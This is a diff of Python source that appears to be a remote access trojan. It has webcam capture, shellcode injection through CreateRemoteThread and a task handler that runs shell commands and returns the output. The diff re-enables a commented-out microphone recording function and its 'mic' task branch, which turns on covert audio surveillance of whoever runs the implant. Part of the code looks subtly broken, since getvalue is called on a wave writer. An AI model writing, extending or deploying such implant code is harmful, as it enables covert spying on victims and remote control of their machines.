@@ -163,7 +163,7 @@ def capture_webcam():
         raise Exception("Webcam failed")
     _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
     return buf.tobytes()
-'''
+
 def record_mic(seconds=10):
     p = pyaudio.PyAudio()
     stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
@@ -181,7 +181,7 @@ def record_mic(seconds=10):
     wf.writeframes(b''.join(frames))
     wf.close()
     return wf.getvalue()  # WAV bytes
-'''
+
 
 def inject_shellcode(pid: int, sc: bytes):
     # Classic CreateRemoteThread injection
@@ -1114,12 +1114,11 @@ def handle_task(task):
         elif ttype == "webcam":
             data = capture_webcam()
             result["output"] = "WEBCAM:" + base64.b64encode(data).decode()
-            '''
-            elif ttype == "mic":
-                secs = int(cmd) if cmd.isdigit() else 10
-                data = record_mic(secs)
-                return chunk_large_output("AUDIO:", data)
-            '''
+            
+        elif ttype == "mic":
+            secs = int(cmd) if cmd.isdigit() else 10
+            data = record_mic(secs)
+            return chunk_large_output("AUDIO:", data)
         elif ttype == "shell":
             out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
             result["output"] = out.decode(errors="ignore")
@@ -1252,3 +1251,4 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
